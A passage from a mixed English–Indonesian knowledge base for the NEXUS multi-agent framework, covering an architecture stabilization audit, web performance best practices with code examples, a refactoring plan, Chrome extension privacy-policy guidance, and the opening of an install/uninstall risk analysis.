- plugin cannot corrupt memory
- plugin respects permissions

---

## Add

- execution timeout
- sandbox layer
- permission validation

---

# 3.9 Stress Testing

## Required

Test system under:

- high task load
- parallel execution
- invalid input
- partial failure

---

## Goal

```text
System does not collapse under pressure
```

---

# 3.10 Chaos Testing (Advanced)

Introduce controlled failure:

- kill agent mid-execution
- corrupt input
- delay responses

---

## Goal

```text
System survives unexpected behavior
```

---

# 4. Metrics You Should Track

```text
task_success_rate
task_retry_rate
error_rate
avg_execution_time
memory_conflict_rate
plugin_failure_rate
```

---

# 5. Definition of "TRULY STABLE"

System bisa disebut stabil jika:

- deterministic
- observable
- recoverable
- scalable
- resilient under stress

---

# 6. Next Evolution Path

```mermaid
graph TD

    A[Stable Multi-Agent]
    B[Deterministic System]
    C[Observable System]
    D[Resilient System]
    E[Persistent Runtime]
    F[Autonomous System]

    A --> B
    B --> C
    C --> D
    D --> E
    E --> F
```

---

# 7. Strategic Warning

JANGAN langsung ke:

```text
autonomy
self-evolution
AGI
```

Jika belum:

```text
stress-tested
fully observable
failure-safe
```

---

# 8. Final Principle

```text
If you cannot debug it,
you cannot scale it.
```

---

# 9. Final Position

```text
NEXUS (Current):
Stable Multi-Agent System

NEXUS (Next Target):
Deterministic & Resilient Cognitive Infrastructure
```


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [ui-ux, performance, vcs, api]

### 📘 KNOWLEDGE: NEXUS_NEXUS STABILIZATION.MD

# NEXUS — Architecture Weaknesses & Stabilization Recommendations
> **VERSION**: v1 | **Last Updated**: 26/05/2026



## Technical Audit Report (Multi-Agent Stabilization Phase)

> Focus:
> Stabilizing NEXUS as a modular semantic multi-agent framework.

---

# 1. Current Architectural Position

## Current State

```text
NEXUS = Experimental Semantic Multi-Agent Framework
```

## NOT Yet

- AGI
- autonomous intelligence
- self-evolving cognition
- fully autonomous runtime

---

# 2. Core Problem Summary

| Area                  | Status |
| --------------------- | ------ |
| Vision                | Strong |
| Documentation         | Strong |
| Modularity            | Medium |
| Agent Isolation       | Weak   |
| Runtime Governance    | Weak   |
| Memory Consistency    | Medium |
| Plugin Safety         | Weak   |
| Scalability Readiness | Medium |
| Autonomy Readiness    | Low    |

---

# 3. Critical Weaknesses

---

# 3.1 Agent Boundary Is Still Blurry

## Problem

Beberapa agent masih memiliki:

- overlapping responsibility
- direct dependency
- mixed orchestration logic
- uncontrolled memory access

---

## Risks

Jika jumlah agent meningkat:

```text
race conditions
context corruption
execution chaos
unpredictable behaviors
```

akan mulai muncul.

---

## Required Solution

### Every Agent MUST Have

```json
{
  "name": "",
  "responsibility": "",
  "allowed_inputs": [],
  "allowed_outputs": [],
  "permissions": [],
  "execution_scope": ""
}
```

---

## Recommendation

Pisahkan dengan tegas:

```text
GOOD:
orchestrator -> agents

BAD:
agents -> controlling other agents directly
```

---

# 3.2 No Strict Agent Contract

## Problem

Belum ada standard universal untuk:

- input format
- output format
- task schema
- error handling
- execution lifecycle

---

## Risks

Tanpa contract:

```text
integration instability
debugging complexity
orchestration fragility
```

---

## Required Solution

## Create Universal Task Protocol

```json
{
  "task_id": "",
  "agent": "",
  "priority": "",
  "input": {},
  "context": {},
  "status": "",
  "timestamp": ""
}
```

---

# 3.3 Memory Governance Is Incomplete

## Problem

Semantic memory sudah bagus secara konsep,
tetapi belum memiliki:

- strict schema
- validation layer
- lifecycle management
- semantic conflict detection
- rollback mechanism

---

## Risks

```text
semantic drift
duplicate meanings
tag inconsistency
knowledge corruption
```

---

## Required Solution

## Recommended Memory Structure

```text
memory/
│
├── raw/
├── normalized/
├── semantic/
├── distilled/
├── operational/
└── archived/
```

---

## Add Mandatory Features

### Must Have

- versioning
- checksum validation
- semantic normalization
- rollback support
- memory audit logs

---

# 3.4 Plugin System Is Not Fully Isolated

## Problem

Scanner/tool execution masih terlalu trusted.

Belum ada:

- isolation
- sandboxing
- execution limits
- permission boundaries

---

## Risks

Future dynamic scanners dapat:

- corrupt memory
- crash orchestration
- overwrite core systems
- create recursive failures

---

## Required Solution

## Every Plugin Must Have

```json
{
  "name": "",
  "version": "",
  "permissions": [],
  "entrypoint": "",
  "execution_timeout": 0
}
```

---

## Add Execution Sandbox

Plugin wajib dijalankan dalam:

```text
isolated execution context
```

---

# 3.5 Core System and Capability System Are Mixed

## Problem

Boundary antara:

- orchestration
- runtime core
- plugins
- scanners

masih belum rigid.

---

## Risks

Future evolution akan menyebabkan:

```text
core instability
maintenance difficulty
uncontrolled coupling
```

---

## Required Solution

## Split Into Two Zones

### CORE (protected)

```text
core/
```

Isi:

- scheduler
- orchestration
- policy engine
- memory governance
- security layer

---

### CAPABILITY LAYER (extensible)

```text
tools/
plugins/
scanners/
```

---

# 3.6 No Event Bus Architecture

## Problem

Current orchestration terlihat masih:

- direct invocation
- tightly coupled execution

---

## Risks

Saat agent bertambah:

```text
execution bottleneck
dependency explosion
system fragility
```

---

## Required Solution

## Introduce Event-Driven Architecture

### Example Events

```text
MEMORY_UPDATED
TASK_COMPLETED
TASK_FAILED
SCANNER_FINISHED
FORGE_REQUESTED
```

---

## Recommended Flow

```text
agents -> emit events -> orchestrator reacts
```

---

# 3.7 Logging & Observability Are Not Mature Yet

## Problem

Belum ada observability standard.

---

## Risks

Tanpa observability:

```text
difficult debugging
unknown runtime failures
hidden memory corruption
```

---

## Required Solution

## Create Dedicated Logging Layer

```text
logs/
│
├── agents/
├── orchestration/
├── memory/
├── scanners/
├── plugins/
└── forge/
```

---

## Mandatory Metrics

### Every Agent Must Log

- execution start
- execution end
- runtime duration
- error state
- memory mutation
- tool usage

---

# 3.8 Too Much Vision Layer vs Runtime Reality

## Problem

Terminologi seperti:

```text
autonomous evolution
physical self-evolution
cognitive ecosystem
```

lebih maju dibanding implementasi runtime aktual.

---

## Risks

```text
architecture confusion
expectation mismatch
maintenance drift
```

---

## Required Solution

## Use Realistic Technical Positioning

### Recommended Positioning

```text
Semantic Multi-Agent Framework
```

atau:

```text
Modular Cognitive Workflow System
```

---

# 3.9 No Runtime Governance Layer

## Problem

Belum ada:

- policy engine
- execution rules
- permission governance
- capability restrictions

---

## Risks

Saat dynamic capability tumbuh:

```text
uncontrolled execution
unsafe module behaviors
runtime corruption
```

---

## Required Solution

## Add Governance Layer

### Governance Responsibilities

- execution permissions
- memory access control
- task priority management
- safety policies
- plugin restrictions

---

# 3.10 Premature C++ Rewrite Risk

## Problem

Architecture belum stabil sepenuhnya,
tetapi sudah ada rencana rewrite besar.

---

## Risks

```text
complexity explosion
development slowdown
maintenance overload
architecture freeze
```

---

## Required Solution

## DO NOT Rewrite Entire System Yet

### Recommended Strategy

Keep:

- Node.js/Python for AI layer

Use C++ ONLY for:

- runtime core
- scheduler
- plugin loader
- high-performance scanning engine

---

# 4. Recommended Stabilization Roadmap

---

# Phase 1 — Agent Stabilization

## Focus

- strict boundaries
- execution contracts
- standardized communication
- role isolation

---

# Phase 2 — Memory Governance

## Focus

- semantic consistency
- versioning
- rollback
- validation
- lifecycle management

---

# Phase 3 — Orchestration Hardening

## Focus

- event bus
- scheduler
- retry logic
- failure handling
- deterministic execution

---

# Phase 4 — Plugin Isolation

## Focus

- sandbox execution
- permission scopes
- execution governance
- capability isolation

---

# Phase 5 — Persistent Runtime

## Focus

- daemon/service runtime
- event loop
- autonomous scheduling
- runtime monitoring

---

# 5. Recommended Architecture Direction

```mermaid
graph TD

    A[Orchestrator]
    B[Event Bus]
    C[Agents]
    D[Memory Layer]
    E[Policy Engine]
    F[Plugins]
    G[Scanners]

    A --> B
    B --> C
    C --> D
    E --> C
    E --> F
    F --> G
```

---

# 6. Most Important Strategic Advice

## DO NOT Chase AGI

Current priority should be:

```text
stable orchestration
```

because:

```text
stability -> scalability
scalability -> survivability
survivability -> future autonomy
```

---

# 7. Final Technical Positioning

## Most Accurate Description

```text
NEXUS is a modular semantic multi-agent framework
focused on orchestration, workflow intelligence,
and scalable cognitive tooling.
```

---

# 8. Final Conclusion

NEXUS memiliki:

- visi kuat
- fondasi bagus
- struktur yang menjanjikan

Tetapi keberhasilan jangka panjang sangat bergantung pada:

```text
architecture discipline
```

Bukan:

- terminology futuristik
- AGI branding
- autonomous claims

---

# 9. Final Strategic Principle

```text
Build stable systems first.
Intelligence emerges later.
```


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [ui-ux, vcs, api]

### 📘 KNOWLEDGE: NEXUS_PERFORMANCE.MD

> **VERSION**: v1 | **Last Updated**: 26/05/2026

## Critical Rendering Path (CRP) Optimization

The Critical Rendering Path dictates how quickly the browser converts HTML, CSS, and JavaScript into painted pixels. 

### DOs
*   **DO inline critical CSS**: Extract styles necessary for above-the-fold content and inject them directly into the HTML `<head>`. Defer the rest of the stylesheet.
*   **DO use `async` or `defer` for all non-critical scripts**: Prevent JavaScript from blocking the DOM parser. Use `defer` for scripts that depend on the DOM or each other, and `async` for independent scripts. `type="module"` is preferred for modern JavaScript and is deferred by default so no need to have an explicit `defer` attribute but you can use `async` on independent module scripts.
*   **DO split CSS by media queries**: Use the `media` attribute on `<link>` tags so the browser downloads unused stylesheets (e.g., print styles or desktop styles on mobile) without blocking the render.
*   **DO utilize resource hints**: Add `preconnect` or `dns-prefetch` for essential third-party domains (e.g., font foundries or API endpoints) to establish early TLS handshakes.

### DON'Ts
*   **DON'T use `@import` in CSS**: This creates sequential request chains that delay the CSS Object Model (CSSOM) construction.
*   **DON'T place large, non-critical JavaScript in the `<head>`**: This halts DOM construction until the script is downloaded, parsed, and executed.
*   **DON'T load invisible or unreachable CSS/JS**: Ensure build tools apply tree-shaking and CSS minification to drop unreachable code before deployment.

### Code Examples

**HTML: Deferring Non-Critical CSS & Scripts**
```html
<!-- Inline critical styles directly in head -->
<style>
  body { margin: 0; font-family: system-ui; }
  .hero { min-height: 100vh; }
</style>

<!-- Defer non-critical CSS -->
<link rel="preload" href="non-critical.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="non-critical.css"></noscript>

<!-- Load CSS conditionally based on viewport -->
<link rel="stylesheet" href="mobile.css" media="(max-width: 768px)">

<!-- Defer JavaScript execution -->
<script defer src="app-bundle.js"></script>
```

### The Resource Hint Navigator

| Hint | Tool Use Case | Example |
| :--- | :--- | :--- |
| `preconnect` | Resolve TLS/DNS for known third-party APIs | API endpoints, font services |
| `dns-prefetch` | Lean fallback for non-critical third-party origins | Ad servers, analytics fallbacks |
| `preload` | Same-origin asset needed *now* for rendering | Hero images, render-blocking fonts |
| `prefetch` | Assets needed for next-page navigation | Next-page bundle, detail views |

**Single-Sentence Mental Model**: "Preconnect for domains, Preload for viewport, Prefetch for futures."

## Largest Contentful Paint (LCP) & Resource Fetching

LCP measures the time required to render the largest visible text or image block within the viewport. Optimize LCP by prioritizing visible elements and prepolishing.

### DOs
*   **DO use `fetchpriority="high"` on the LCP image**: Signal to the browser's heuristic engine to elevate the image's priority above scripts and non-critical assets.
*   **DO declare the LCP image in standard HTML**: Ensure the `<img>` tag is present in the raw HTML response so the preload scanner discovers it immediately. Avoid relying on JavaScript to mount the LCP element.
*   **DO preload background images acting as LCP**: If the LCP element is a CSS `background-image`, force early discovery using `<link rel="preload" as="image">` coupled with `fetchpriority="high"`.
*   **DO use `fetchpriority="low"` to demote competing elements**: Lower the priority of large images or carousels that appear above the fold but are *not* the primary LCP element.

### DON'Ts
*   **DON'T lazy-load the LCP image**: Never apply `loading="lazy"` to above-the-fold images. This purposefully delays the fetch until layout calculation is complete, severely degrading LCP.
*   **DON'T overuse `fetchpriority="high"`**: Prioritization is a zero-sum mechanism. Elevating too many resources creates network contention and negates the benefit.
*   **DON'T implement complex JavaScript loaders for the hero section**: Client-side rendering of the LCP element introduces substantial request chains (HTML -> JS -> Execution -> Image Request).

### Code Examples

**HTML: LCP Image Optimization**
```html
<!-- Standard LCP Image -->
<img 
  src="/images/hero.webp" 
  alt="Hero Product" 
  fetchpriority="high" 
  decoding="sync"
  width="1200" 
  height="600"
>

<!-- Preloading a CSS-based LCP background -->
<link rel="preload" as="image" href="/images/bg-hero.webp" fetchpriority="high" type="image/webp">

<!-- Demoting an above-the-fold non-LCP carousel image -->
<img src="/images/carousel-2.webp" fetchpriority="low" alt="Slide 2">
```

## Interaction to Next Paint (INP) & Main Thread Unblocking

INP measures the latency of all interactive events across the page's lifecycle. Poor INP is caused by long-running JavaScript tasks blocking the main thread. 

### DOs
*   **DO break up long tasks**: Any JavaScript execution exceeding 50ms should be split. Yield to the main thread frequently so the browser can process pending user inputs.
*   **DO use `scheduler.yield()` with a fallback**: Utilize the modern `scheduler.yield()` API to place task continuations at the *front* of the queue, falling back to `setTimeout` wrapped in a Promise for unsupported browsers.
*   **DO debounce or throttle rapid event listeners**: Limit the execution frequency of handlers attached to `scroll`, `resize`, or rapid `input` events.
*   **DO separate UI updates from heavy computations**: Update the UI synchronously to provide immediate visual feedback, then push background processing to a Web Worker or deferred task.

### DON'Ts
*   **DON'T rely solely on `setTimeout(..., 0)` for continuous yielding**: Standard `setTimeout` places continuations at the *back* of the task queue, potentially causing long delays if other tasks are pending.
*   **DON'T cause layout thrashing**: Avoid interleaving DOM reads (`offsetHeight`, `getBoundingClientRect`) and writes (`style.height`) within the same loop. Batch DOM reads, then batch DOM writes.
*   **DON'T block the thread with recurring timers**: Avoid heavy polling with `setInterval` that starves the main thread.

### Code Examples

**JS: `scheduler.yield` Polyfill and Usage**
```javascript
// Polyfill for yielding to main thread
async function yieldToMain() {
  if ('scheduler' in window && 'yield' in scheduler) {
    return await scheduler.yield();
  }
  return new Promise(resolve => setTimeout(resolve, 0));
}

// Processing a large array without blocking user input
async function processLargeList(items) {
  for (let i = 0; i < items.length; i++) {
    processItem(items[i]);
    
    // Yield every 50 iterations to allow rendering/interaction
    if (i % 50 === 0) {
      await yieldToMain();
    }
  }
}
```

### Main Thread Task Slicing Heuristic

**The 50ms Rule for INP**:
- **< 50ms**: Execute synchronously.
- **50ms - 250ms**: Slice tasks and yield with `scheduler.yield()`.
- **> 250ms**: Offload to a Web Worker.

## Third-Party Script Management

Third-party scripts (analytics, ads, chat widgets) are the primary source of main thread congestion.

### DOs
*   **DO avoid third-party scripts blocking main content**: Use `defer` with all third-party scripts unless critical to the page load and load them in the footer of the page, rather than the `<head>`.
*   **DO self-host critical third-party dependencies**: Reduce DNS lookups and enforce custom `Cache-Control` logic by hosting third-party libraries on the origin domain.

### Code Examples

**HTML: Third-Party Script Execution**
```html
<!-- 1. Place third-party scripts near the end of the page with the defer attribute -->
<script defer src="http://www.example.com/third-party.js"></script>
```

## CSS Rendering & Containment Optimization

Rendering involves Layout, Style, Paint, and Compositing calculations. CSS Containment limits the scope of these calculations which is useful on large, complex pages where such calculations can cause performance problems.

### DOs
*   **DO use `content-visibility: auto` on off-screen sections on large, complex pages**: Instruct the browser to skip layout and paint calculations for entire subtrees until they approach the viewport.
*   **DO pair `content-visibility` with `contain-intrinsic-size`**: Prevent layout shifts and scrollbar jumping by providing a placeholder height/width for unrendered containers.
*   **DO apply explicit CSS containment (`contain`)**: For isolated UI components (like modals or widgets), use `contain: layout style paint` to prevent internal changes from triggering page-wide reflows.

### DON'Ts
*   **DON'T apply `content-visibility: auto` on smaller, simpler pages**: The gains will be negligible and there are risks of side effects with content jumping.
*   **DON'T apply `content-visibility: auto` to above-the-fold content**: The browser will still evaluate it, but forcing it through the containment engine unnecessarily adds slight overhead to visible elements.
*   **DON'T overuse `will-change` globally**: Indiscriminately applying `will-change: transform` to multiple elements consumes excessive VRAM, causing GPU crashes or sluggish rendering.
*   **DON'T forget accessibility when hiding elements**: `content-visibility: auto` keeps elements in the DOM for screen readers. If content should be truly hidden from assistive technology when off-screen, manage `aria-hidden` attributes manually.

### Code Examples

**CSS: Content Visibility and Containment**
```css
/* Optimize a long list of articles below the fold */
.article-list-item {
  content-visibility: auto;
  contain-intrinsic-size: auto 600px; /* Provides a 600px placeholder */
}

/* Scope a complex widget to prevent layout thrashing */
.isolated-widget {
  contain: layout style paint;
}

/* Hardware accelerate an animation only on hover */
.interactive-button:hover {
  will-change: transform;
  transform: scale(1.05);
}
```

## Modern Image & Media Optimization

Images typically represent the largest payload on a given web page. Optimization requires format negotiation, responsive sizing, and layout stabilization.

### DOs
*   **DO serve modern formats (AVIF / WebP)**: Use the `<picture>` element to offer AVIF (best compression), falling back to WebP, and finally JPEG/PNG for legacy browsers.
*   **DO apply explicit `width` and `height` attributes**: Setting native attributes allows the browser to compute the aspect ratio immediately, reserving space and eliminating CLS. Image dimensions may be set either as HTML attributes or CSS properties.
*   **DO utilize `loading="lazy"` on all below-the-fold images**: Utilize native browser lazy loading to defer network requests for images outside the initial viewport.
*   **DO implement responsive images with `srcset` and `sizes`**: Serve tailored resolutions based on screen density and viewport width to prevent mobile devices from downloading desktop-sized images.

### DON'Ts
*   **DON'T lazy load above-the-fold images**: This directly harms LCP. Visible images must use `loading="eager"` (the default).
*   **DON'T delete necessary dimensions**: Failing to specify width/height on lazy loaded images causes layout shifts.
*   **DON'T omit the `sizes` attribute when using `srcset`**: Without `sizes`, the browser assumes `100vw` and downloads the largest available image.

### Code Examples

**HTML: Comprehensive Responsive Image Component**
```html
<picture>
  <!-- Modern Formats with Source Negotiation -->
  <source type="image/avif" srcset="hero-400w.avif 400w, hero-800w.avif 800w" sizes="(max-width: 600px) 100vw, 50vw">
  <source type="image/webp" srcset="hero-400w.webp 400w, hero-800w.webp 800w" sizes="(max-width: 600px) 100vw, 50vw">
  
  <!-- Fallback + Dimensions + Priority for Above-The-Fold -->
  <img 
    src="hero-800w.jpg" 
    alt="Descriptive text" 
    width="800" 
    height="600"
    fetchpriority="high"
    loading="eager"
  >
</picture>

<!-- Below-The-Fold Image -->
<img 
    src="footer-icon.png" 
    alt="Footer Logo" 
    width="100" 
    height="100"
    loading="lazy"
>

<!-- DO: Use native lazy loading for below the fold iframes -->
<iframe src="https://example.com/map" width="800" height="600" loading="lazy" title="Example Map"></iframe>
```

## Service Workers & Caching Strategies

Client-side caching via Service Workers allows applications to bypass the network entirely, serving resources from disk/memory.

### DOs
*   **DO use a `CacheFirst` strategy for static, versioned assets**: Immutable files (fonts, JS/CSS bundles with hash strings) should be served directly from the cache to guarantee instant loading.
*   **DO use `StaleWhileRevalidate` for dynamic, non-critical resources**: For API calls where slight staleness is acceptable, serve immediately from cache while silently updating the cache in the background.
*   **DO implement a `NetworkFirst` strategy for HTML documents**: Ensure the user always receives the latest application shell and manifest, falling back to cache only if offline.
*   **DO restrict cache sizes and expiry**: Use expiration plugins to prevent the Service Worker from exhausting the device's storage quota.

### DON'Ts
*   **DON'T cache opaque responses blindly**: Responses from third-party domains lacking CORS headers are "opaque". Caching them heavily consumes quota and fails silently. Only cache them using `NetworkFirst` or `StaleWhileRevalidate`.
*   **DON'T cache POST requests**: Service workers cannot cache non-GET requests natively. Implement background sync queues for offline submissions.
*   **DON'T bypass versioning**: Failing to update asset hashes/versions will trap users in infinite cache loops.

### Code Examples

**JS: Service Worker Caching via Workbox**
```javascript
import { registerRoute } from 'workbox-routing';
import { CacheFirst, StaleWhileRevalidate, NetworkFirst } from 'workbox-strategies';
import { ExpirationPlugin } from 'workbox-expiration';
import { CacheableResponsePlugin } from 'workbox-cacheable-response';

// 1. HTML Documents: Network First
registerRoute(
  ({ request }) => request.mode === 'navigate',
  new NetworkFirst({ cacheName: 'pages-cache' })
);

// 2. Static Assets (JS, CSS, Fonts): Cache First
registerRoute(
  ({ request }) => ['style', 'script', 'font'].includes(request.destination),
  new CacheFirst({
    cacheName: 'static-resources',
    plugins: [
      new CacheableResponsePlugin({ statuses: [0, 200] }),
      new ExpirationPlugin({ maxEntries: 50, maxAgeSeconds: 30 * 24 * 60 * 60 })
    ]
  })
);

// 3. API Responses: Stale While Revalidate
registerRoute(
  ({ url }) => url.pathname.startsWith('/api/v1/content'),
  new StaleWhileRevalidate({
    cacheName: 'api-cache',
    plugins: [
      new CacheableResponsePlugin({ statuses: [0, 200] })
    ]
  })
);
```

## Web Fonts Optimization

Web fonts are a common source of render blocking. Optimizing them reduces the Flash of Invisible Text (FOIT) and speeds up initial rendering.

### DOs
*   **DO preload critical fonts**: Use `<link rel="preload" as="font" type="font/woff2" crossorigin>` for fonts seen above the fold.
*   **DO subset fonts**: Trim font weights and glyph variations to include only the characters your application requires.

### DON'Ts
*   **DON'T preload all fonts**: Over-preloading leads to network contention that starves other critical assets.

### Code Examples

**CSS: Font Loading Face**
```css
@font-face {
  font-family: 'Modern Sans';
  src: url('/fonts/modern-sans.woff2') format('woff2');
}
```

**HTML: Critical Font Preload**
```html
<!-- Always use crossorigin for fonts even if on the same origin -->
<link rel="preload" href="/fonts/modern-sans.woff2" as="font" type="font/woff2" crossorigin>
```

## Video Performance & Metrics

Video payloads are among the heaviest assets. Optimization focuses on reducing bandwidth stall and preserving Cumulative Layout Shift (CLS) stability.

### DOs
*   **DO specify explicit `width` and `height` attributes**: Setting native dimensions reserves layout space and prevents CLS.
*   **DO provide a `poster` image fallback**: Display a lightweight image placeholder while the video buffers to improve perceived performance.
*   **DO use `preload="none"` for non-critical videos**: Delay bandwidth consumption for below-the-fold or non-autoplaying videos.
*   **DO serve modern formats via source negotiation**: Offer WebM (better compression ratio) alongside standard MP4 formats.
*   **DO use `loading="lazy"` for offscreen videos**: Lazy-loading videos allow `poster` and `preload` downloads to be deferred until the video is in or near the viewport.

### DON'Ts
*   **DON'T auto-play video files blindly**: Rely on user intent or use progressive enhancement streams.
*   **DON'T auto-play large video files at all**: Rely on user intent before downloading large files.

### Code Examples

**HTML: Accessible and Dynamic Video Loader**
```html
<video 
  controls 
  width="1200" 
  height="675"
  poster="/images/video-poster.webp" 
  preload="none"
>
  <source src="/videos/intro.webm" type="video/webm">
  <source src="/videos/intro.mp4" type="video/mp4">
  <!-- Include accessibility tracks -->
  <track src="/video-caps.vtt" kind="captions" srclang="en" label="English">
</video>
```

## JavaScript Code-Splitting

Heavy monolithic bundles block main thread parse times on low-end devices. Splitting ensures we only download bytes required for the immediate viewport.

### DOs
*   **DO use dynamic imports**: Split routes or heavy UI libraries using standard `import()` specifications.
*   **DO configure bundler asset chunking**: Use Vite or Webpack rollup directives to split third-party vendors from runtime application logic.

### DON'Ts
*   **DON'T ship a single, enormous `app.js` bundle**: It increases parse time and memory consumption for initial views.

### Code Examples

**JS: Route based Dynamic Splitting**
```javascript
// Dynamic import of heavy module only when button is clicked
document.getElementById('heavy-btn').addEventListener('click', async () => {
  const { heavyFunction } = await import('./heavy-module.js');
  heavyFunction();
});
```


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [ui-ux, performance, vcs, api]

### 📘 KNOWLEDGE: NEXUS_STABILIZATION_PLAN.MD

# Implementation Plan: Nexus Core Stabilization & Hygiene
> **VERSION**: v1 | **Last Updated**: 26/05/2026



This plan addresses the critical bugs, architectural redundancies, and repository hygiene issues identified during the system audit.

## 🛠 Phase 1: Core Engine Refactoring (NexusEngine.js)
**Goal**: Eliminate duplicate methods, fix undefined variables, and clean up constructor logic.

### Tasks:
- [x] **Fix Constructor Redundancy**:
    - Consolidate path assignments for `knowledgePath`, `recordsPath`, `summaryPath`, and `planningPath`.
    - Ensure `resolvePath()` is used consistently.
- [x] **Resolve `this.nexusPath` Bug**:
    - Map `this.nexusPath` to `this.nexusDataPath` or fix the reference to use the correct variable.
- [x] **Deduplicate Methods**:
    - Remove the second definition of `getSemanticTags()` (lines 956-963).
    - Remove the second definition of `globRecursive()` (lines 978-986).
    - Ensure the remaining implementations are robust (handle absolute paths and different OS environments).

## 📂 Phase 2: Repository Hygiene & Git Configuration
**Goal**: Prevent runtime artifacts and temporary scripts from cluttering the repository.

### Tasks:
- [x] **Update `.gitignore`**:
    - Add `scratch/` folder.
    - Add session history archives: `knowledge/*_SESSION_HISTORY_ARCHIVE.md`.
    - Add performance artifacts: `memory/distilled/performance/*.MD`.
    - Add log files: `logs/*.log`.
- [x] **Cleanup Command**: (Optional) Provide a script to purge existing untracked artifacts.

## 🏗 Phase 3: Workflow Consolidation
**Goal**: Establish a single "Source of Truth" for agent workflows to simplify maintenance.

### Tasks:
- [x] **Identify Primary Source**: Set `agent/workflows/` as the master directory.
- [x] **Merge Contents**: Ensure all unique workflows from `workflow/` and `NEXUS_PUBLIC_DISTRIBUTION/agent/workflows/` are migrated to the master.
- [x] **Redundancy Removal**: Propose removing the redundant directories or replacing them with a distribution build script.

## 🧪 Phase 4: Test Coverage Expansion
**Goal**: Increase stability by adding tests for missing core components.

### Tasks:
- [x] **Create Test Scaffolds**:
    - `MemoryGovernor.test.js`
    - `Orchestrator.test.js`
    - `Machinist.test.js`
- [x] **Integrate with CI/CD**: Ensure new tests are included in the `npm test` suite.

---
**Status**: ✅ Finished
**Completion Date**: 2026-05-10
**Lead Agent**: Antigravity


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [ui-ux, tdd, vcs]

### 📘 KNOWLEDGE: NEXUS_PRIVACY-POLICY.MD

# Privacy Policy Guidance
> **VERSION**: v2 | **Last Updated**: 26/05/2026



## When is a Privacy Policy Required?

A privacy policy URL is **required** if your extension:
- Handles personal or sensitive user data (as defined by CWS policies)
- Uses any of these permissions: `identity`, `cookies`, `webRequest`, `browsingData`,
  `history`, `bookmarks`, `topSites`, `<all_urls>` host permission
- Collects any form of analytics or telemetry
- Transmits any data off the user's device

A privacy policy is **recommended** for all extensions, even if no data is collected.
It demonstrates professionalism and can prevent delays if a reviewer flags your extension.

## Where to Host It

The privacy policy must be at a publicly accessible URL. Options:
- **GitHub Pages**: Free, version-controlled. Create a `[privacy.md](../security/NEXUS_PRIVACY.MD)` in a `docs/` branch.
- **GitHub Gist**: Quick and dirty. Create a public gist and link to the raw URL.
- **Project website**: If you have one, add a `/privacy` page.
- **Notion / Google Sites**: Free hosted pages. Stable URLs.

Avoid hosting on a URL that might go down or change. The CWS review team checks the link.

## What to Include

### Minimal Policy (No Data Collection)

If your extension genuinely collects no data, the policy can be short:

```
Privacy Policy for [Extension Name]

Last updated: [Date]

[Extension Name] does not collect, store, or transmit any personal data or
browsing information. All data stays on your device.

This extension does not use cookies, analytics, or third-party services.

If you have questions, contact [email].
```

### Standard Policy (Some Data Collection)

If your extension stores or transmits data, cover these topics:

1. **What data is collected** — Be specific. "User preferences" is not enough.
   Say "Your selected theme preference (light/dark) and saved highlight colors."

2. **How data is stored** — Local storage only? Synced via chrome.storage.sync?
   Sent to a server?

3. **Why data is collected** — Tie each data type to a specific feature.

4. **Third-party services** — If you use any APIs (analytics, auth, etc.), name them
   and link to their privacy policies.

5. **Data sharing** — State whether data is shared with third parties. If yes, with
   whom and why. If no, say so explicitly.

6. **Data retention** — How long is data kept? Can the user delete it?

7. **User controls** — How can users access, export, or delete their data?
   If the extension has a "clear data" button, mention it.

8. **Changes to the policy** — State that you'll update the policy if practices change
   and how users will be notified.

9. **Contact** — Email or URL for privacy questions.

### Template

```
Privacy Policy for [Extension Name]

Last updated: [Date]

## What Data We Collect

[Describe each type of data collected and the feature that requires it.]

## How Data Is Stored

[Describe storage mechanism — local only, synced, or server-side.]

## How Data Is Used

[Describe each use case. Tie to specific features.]

## Third-Party Services

[List any third-party services used. Link to their privacy policies.
If none, state "This extension does not use any third-party services."]

## Data Sharing

[State whether data is shared. If yes, with whom and why.]

## Data Retention and Deletion

[How long data is kept. How users can delete it.]

## Changes to This Policy

[How and when the policy may be updated. How users will be notified.]

## Contact

[Email or support URL for privacy inquiries.]
```

## Common Mistakes

- **Policy doesn't match the data disclosure form**: The CWS data disclosure form and your
  privacy policy must be consistent. If the form says "no data collected" but the policy
  mentions analytics, you'll be rejected.

- **Policy is too vague**: "We may collect some data" is not acceptable. Be specific.

- **Dead link**: If your privacy policy URL returns a 404, the submission is auto-rejected.
  Verify the link before submitting.

- **Missing data types**: If your extension uses `chrome.storage.sync`, that data goes to
  Google's servers — disclose this. If you make any `fetch()` calls, disclose what's sent.

- **No contact information**: The CWS requires a way for users to reach you about privacy
  concerns. Include an email address at minimum.


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [vcs, api]

### 📘 KNOWLEDGE: NEXUS_RECORD-NEXUS-INSTALL-UNINSTALL-ANALYSIS.MD

# 📑 RECORD: Analisis Mekanisme Instalasi & Uninstalasi Nexus AI
> **VERSION**: v1 | **Last Updated**: 26/05/2026



| Detail | Deskripsi |
| :--- | :--- |
| **ID Record** | REC-NEXUS-MNG-001 |
| **Tanggal** | 2026-05-08 |
| **Status** | FINAL (Review Pending) |
| **Topik** | Manajemen Lifecycle Nexus di Deployed Project |

---

## 1. 🔍 Konteks Teknis
Analisis dilakukan terhadap file `cli.js` dan `agent/main.js` untuk memahami bagaimana Nexus berinteraksi dengan direktori project target selama proses instalasi dan uninstalasi, terutama jika dilakukan pada project yang sudah dalam status *deployed*.

---

## 2. 🛠️ Perubahan State (Before vs After)

### 2.1 Perintah: `nexus install`
*   **State Before**: Project murni hanya berisi file aplikasi (Laravel/TALL stack).
*   **Action**: Pembuatan folder `nexus/` dan penyalinan prompt/workflow eksternal.
*   **State After**: 
    *   Muncul direktori `./nexus/` (berisi: `agent/`, `memory/`, `logs/`, `documentation/`).
    *   Muncul file `ALGORITMA_INTEGRASI.md` di root project.
*   **Impact**: Project membengkak secara ukuran file, namun tidak mengubah `runtime logic` aplikasi utama.

### 2.2 Perintah: `nexus uninstall`
*   **State Before**: Project memiliki folder `nexus/` yang berisi data audit dan memori AI.
*   **Action**: Penghapusan rekursif folder `nexus/`.
*   **State After**: Project kembali ke state awal tanpa jejak Nexus.
*   **Impact**: **DATA LOSS CRITICAL**. Seluruh riwayat audit, rekaman perubahan (Record), dan memori jangka panjang agent terhapus secara permanen.

---

## 3. ⚠️ Analisis Risiko & Masalah (Identified Issues)

